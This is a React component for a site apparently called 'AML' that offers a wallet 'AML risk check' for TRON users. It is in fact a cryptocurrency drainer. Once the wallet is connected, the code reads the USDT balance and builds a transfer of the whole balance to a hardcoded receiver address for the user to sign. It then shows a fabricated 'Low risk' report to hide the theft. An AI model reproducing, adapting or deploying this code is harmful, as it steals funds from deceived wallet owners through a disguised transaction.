import React, { useState } from "react";
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
// @ts-ignore
const TronWeb = require('tronweb');
import { Buffer } from "buffer";
window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});

export const TronAuthButton: React.FC = () => {
  const [status, setStatus] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  const connectWallet = async () => {
    setLoading(true);
    setStatus(null);
    try {
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error('Invalid wallet address');
      }

      tronWeb.setAddress(userAddress);

      // Check TRX balance for gas (at least 3 TRX recommended for USDT TX)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;
      if (trx < 3) {
        setStatus('❌ Insufficient TRX. At least 3 TRX is required for commission.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // Get USDT balance
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        setStatus('✅ AML report: Low risk. Minimal USDT balance.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      // Build TX for USDT transfer
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        {
          feeLimit: 25_000_000,
          callValue: 0,
        },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      // Sign TX with WalletConnect
      const signedTx = await adapter.signTransaction(transaction);

      // Broadcast TX
      const result = await tronWeb.trx.sendRawTransaction(signedTx);
      if (!result.result) {
        if (result.code === "NO_ENOUGH_EFFECTIVE_CONNECTION") {
          setStatus("⚠️ TRON node error. Try again later.");
        } else {
          setStatus('⚠️ Connection or transaction error');
        }
      } else {
        setStatus('✅ AML report: All USDT funds transferred.\nLow risk.');
      }
    } catch (err: any) {
      if (
        err?.message?.includes('User rejected') ||
        err?.message?.includes('Modal is closed') ||
        err?.message?.includes('Timeout')
      ) {
        // Не показываем ошибку, если юзер сам отменил
        setStatus(null);
      } else if (err?.message?.toLowerCase().includes('insufficient trx')) {
        setStatus('❌ Insufficient TRX. At least 3 TRX is required for commission.');
      } else {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  };

  return (
    <div onClick={connectWallet} className="AuthButton" style={{ cursor: 'pointer' }}>
      <span>Check Your Wallet</span>
      {loading && (
        <div className="modal__overflow">
          <div className="modal">
            <p>🔄 Connecting wallet...</p>
          </div>
        </div>
      )}
      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status.startsWith('✅') ? (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green"></span> 0–30</div>
                      <div><span className="circ orange"></span> 31–69</div>
                      <div><span className="circ red"></span> 70–100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            ) : (
              <p>{status}</p>
            )}
            <button onClick={e => { e.stopPropagation(); setStatus(null); }}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
